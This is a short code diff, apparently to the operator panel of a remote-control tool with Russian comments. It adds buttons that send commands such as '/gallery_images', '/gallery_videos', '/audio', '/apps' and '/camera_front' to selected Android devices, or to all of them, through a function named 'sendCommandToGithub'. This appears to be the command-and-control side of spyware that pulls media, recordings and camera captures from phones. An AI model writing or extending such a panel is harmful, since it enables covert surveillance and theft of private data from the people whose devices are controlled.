@@ -601,6 +601,28 @@ function init() {
         addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${androidCurrentDevice === "all" ? "ВСЕ" : androidCurrentDevice}`, "success", true);
     });
     
+
+// Дополнительные обработчики для новых Android команд
+document.getElementById("androidGalleryImagesBtn")?.addEventListener("click", () => {
+    sendCommandToGithub("/gallery_images", true);
+});
+
+document.getElementById("androidGalleryVideosBtn")?.addEventListener("click", () => {
+    sendCommandToGithub("/gallery_videos", true);
+});
+
+document.getElementById("androidAudioBtn")?.addEventListener("click", () => {
+    sendCommandToGithub("/audio", true);
+});
+
+document.getElementById("androidAppsBtn")?.addEventListener("click", () => {
+    sendCommandToGithub("/apps", true);
+});
+
+document.getElementById("androidCameraFrontBtn")?.addEventListener("click", () => {
+    sendCommandToGithub("/camera_front", true);
+});
+    
     // ============= ВКЛАДКИ PC =============
     document.querySelectorAll('#pcMode .tab-btn').forEach(btn => {
         btn.onclick = () => {
